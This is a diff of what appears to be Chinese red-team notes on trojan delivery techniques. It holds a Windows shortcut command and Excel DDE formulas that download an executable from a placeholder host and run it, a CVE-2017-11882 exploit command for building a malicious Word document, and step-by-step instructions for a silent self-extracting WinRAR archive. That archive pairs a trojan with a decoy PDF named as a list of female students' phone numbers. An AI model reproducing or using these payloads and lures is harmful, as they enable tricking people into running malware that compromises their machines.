@@ -24,13 +24,16 @@
 	- 生成木马exe文件
 	- 创建快捷方式：``C:\Windows\System32\cmd.exe /k curl http://xxx.xxx.xxx.xxx/exe/artifact.exe --output C:\Windows\temp\win.exe && C:\Windows\temp\win.exe``
 	- 更换一个系统图标
-+ Word宏病毒
-+ Excel注入
-	+ 弹计算器：``=cmd| '/c calc'! '!A1'``
-	+ 上线木马：``=cmd| '/c curl http://xxx.xxx.xxx.xxx/beacon.exe --output C:\Windows\temp\win.exe && C:\Windows\temp\win.exe' ! 'A1'``
-+ CVE-2017-11882
-	- poc：``https://github.com/Ridter/CVE-2017-11882``
-	- 生成病毒word文件：``python2 Command109b_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc``
++ WinRAR
+	- 生成木马MDE.exe,附件为 "美女大学生电话号码列表.pdf"
+	- 选中2个文件，右键 "添加到压缩文件"
+	- 点击创建自解压格式压缩文件
+	- 点击高级"自解压选项"
+		+ 常规:设置释放路径为"C:\windows\temp",勾选"绝对路径"
+		+ 设置:解压后运行文件依次为"C:\windows\temp\MDE.exe","C:\windows\temp\美女大学生电话号码列表.pdf"
+		+ 模式:全部隐藏
+		+ 更新:勾选"解压并更新文件","覆盖所有文件"
+		+ 文本和图标：选择合适的ico
 
 邮件钓鱼
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
